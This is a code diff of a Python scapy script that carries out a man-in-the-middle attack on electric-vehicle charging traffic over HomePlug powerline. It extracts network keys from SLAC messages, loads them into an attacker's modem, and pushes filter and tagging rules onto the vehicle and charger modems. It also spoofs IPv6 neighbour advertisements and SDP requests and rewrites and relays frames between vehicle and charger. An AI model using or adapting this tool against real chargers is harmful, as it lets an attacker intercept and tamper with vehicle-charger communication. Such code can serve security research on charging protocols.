@@ -1,15 +1,17 @@
 import os
-from scapy.all import Ether, IPv6, sendp, sniff, ICMPv6ND_NS, ICMPv6ND_NA, ICMPv6NDOptDstLLAddr
+from scapy.all import Ether, Dot1Q, IPv6, sendp, sniff, ICMPv6ND_NS, ICMPv6ND_NA, ICMPv6NDOptDstLLAddr
 from scapy.contrib.homeplugav import HomePlugAV
 from scapy.contrib.homepluggp import CM_SET_KEY_REQ
 from optparse import OptionParser
+from binascii import unhexlify
 
 
 int6krule = "/home/jakob/git/open-plc-utils/plc/int6krule"
-pev_modem_mac = None #"98:ed:5c:93:0d:66"
-evse_modem_mac = "00:01:87:05:b7:95"
+pev_modem_mac = "98:ed:5c:93:0d:66"
+evse_modem_mac = None # "00:01:87:05:b7:95"
 evse_mac = None
 pev_mac = None
+
 
 
 def set_key_on_modem(nid, nmk, srcmac, dstmac, interface):
@@ -18,8 +20,8 @@ def set_key_on_modem(nid, nmk, srcmac, dstmac, interface):
         / CM_SET_KEY_REQ(KeyType=0x1, MyNonce=0xAAAAAAAA, YourNonce=0xe0218244, PID=0x4, NetworkID=nid, NewEncKeySelect=0x1, NewKey=nmk)
 
     # send packet twice -> first time the response is a failure for some reason
-    sendp(set_key_pkg, iface=interface, verbose=1)
-    sendp(set_key_pkg, iface=interface, verbose=1)
+    sendp(set_key_pkg, iface=interface, verbose=0)
+    sendp(set_key_pkg, iface=interface, verbose=0)
 
 
 def handle_cm_slac_match_cnf(packet, iface, src_mac, dst_mac):
@@ -42,13 +44,14 @@ def handle_packet(packet, iface, our_mac, dst_mac):
     if 'HomePlugAV' in packet and packet['HomePlugAV'].HPtype == 0x607d:
         handle_cm_slac_match_cnf(packet, iface, our_mac, dst_mac)
 
+    if 'HomePlugAV' in packet and packet['HomePlugAV'].HPtype == 0x6065:
         # Get pev and evse mac addresses
         evse_mac = packet[Ether].src
         pev_mac = packet[Ether].dst
 
         # Add rules to powerline modems
         if pev_modem_mac is not None:
-            os.system(f"{int6krule} -i {iface} DropRX Any EthSA Not {our_mac} add temp '{pev_modem_mac}'")
+            os.system(f"{int6krule} -i {iface} -T 8100002a -V 2 TagTX All EthDA Is 33:33:00:00:00:01 add temp '{pev_modem_mac}'")
         if evse_modem_mac is not None:
             os.system(f"{int6krule} -i {iface} DropRX Any EthSA Not {our_mac} add temp '{evse_modem_mac}'")
 
@@ -63,7 +66,7 @@ def handle_packet(packet, iface, our_mac, dst_mac):
             ICMPv6ND_NA(tgt=target_ip, R=0, S=1, O=1) /
             ICMPv6NDOptDstLLAddr(lladdr=our_mac)
         )
-        sendp(na_packet, iface=iface)
+        sendp(na_packet, iface=iface, verbose=0)
 
     if Ether in packet and str(packet[Ether].src) == pev_mac and str(packet[Ether].dst) == our_mac:
         if ICMPv6ND_NS in packet or ICMPv6ND_NA in packet:
@@ -71,7 +74,7 @@ def handle_packet(packet, iface, our_mac, dst_mac):
         modified_packet = packet.copy()
         modified_packet[Ether].src = our_mac
         modified_packet[Ether].dst = evse_mac
-        sendp(modified_packet, iface=iface)
+        sendp(modified_packet, iface=iface, verbose=0)
 
     if Ether in packet and str(packet[Ether].src) == evse_mac and str(packet[Ether].dst) == our_mac:
         if ICMPv6ND_NS in packet or ICMPv6ND_NA in packet:
@@ -79,16 +82,22 @@ def handle_packet(packet, iface, our_mac, dst_mac):
         modified_packet = packet.copy()
         modified_packet[Ether].src = our_mac
         modified_packet[Ether].dst = pev_mac
-        sendp(modified_packet, iface=iface)
+        sendp(modified_packet, iface=iface, verbose=0)
 
-    if Ether in packet and (str(packet[Ether].src) == pev_mac or str(packet[Ether].src) == evse_mac) and str(packet[Ether].dst) == "33:33:00:00:00:01":
+    if Dot1Q in packet and str(packet[Ether].src) == pev_mac and str(packet[Ether].dst) == "33:33:00:00:00:01":
+        # this is a tagged ipv6 broadcast. The tag was added by the int6krule added to the PEV above
+        # for some reason tagged packets are broken by QCA, so we add the missing 4 byte SDP request at the end 
+        modified_packet = Ether(src=our_mac, dst="33:33:00:00:00:01") / packet[IPv6:] / unhexlify("00021000")
+        #modified_packet[Ether].src = our_mac
+        sendp(modified_packet, iface=iface, verbose=0)
+    elif Ether in packet and (str(packet[Ether].src) == pev_mac or str(packet[Ether].src) == evse_mac) and str(packet[Ether].dst) == "33:33:00:00:00:01":
         if ICMPv6ND_NS in packet or ICMPv6ND_NA in packet:
             return # drop neighbor solicitation / advertisements between PEV and EVSE
 
         # forward SDP request
         modified_packet = packet.copy()
         modified_packet[Ether].src = our_mac
-        sendp(modified_packet, iface=iface)
+        sendp(modified_packet, iface=iface, verbose=0)
 
 
 
@@ -96,19 +105,20 @@ if __name__ =="__main__":
     usage = "usage: %prog [options] \nUse this program to extract the NID and NMK of the CM_SLAC_MATCH.CNF message and configure rules for the pev and evse powerline modems to accept only packets from the given source-mac (your mac). Then spoof the sdp request and read all the traffic as mitm."
     parser = OptionParser(usage)
     parser.add_option("-i", "--interface", help="Interface where the powerline modem is connected", metavar="INTERFACE")
-    parser.add_option("-y", "--yourmac", help="Your MAC Address of the given Interface", metavar="OURMAC")
+    parser.add_option("-y", "--ourmac", help="Your MAC Address of the given Interface", metavar="OURMAC")
     parser.add_option("-d", "--destinationmac", help="MAC Address of the mitm modem, to which the set_key message ist sent", metavar="DESTINATIONMAC")
     (options, _) = parser.parse_args()
 
     set_key_after_sniffing = False
-    if options.keyset:
-        if not(options.interface):
-            print("The interface must be specified.")
-            exit(1)
-        if not(options.destinationmac):
-            print("The destination mac of the mitm modem must be specified.")
-        if not(options.ourmac):
-            print("Your own mac must be specified.")
+    if not(options.interface):
+        print("The interface must be specified.")
+        exit(1)
+    if not(options.destinationmac):
+        print("The destination mac of the mitm modem must be specified.")
+        exit(1)
+    if not(options.ourmac):
+        print("Your own mac must be specified.")
+        exit(1)
     
     print("starting to sniff for a CM_SLAC_MATCH_CNF")
     sniff(iface=options.interface, prn=lambda packet: handle_packet(packet, options.interface, options.ourmac, options.destinationmac), store=False)
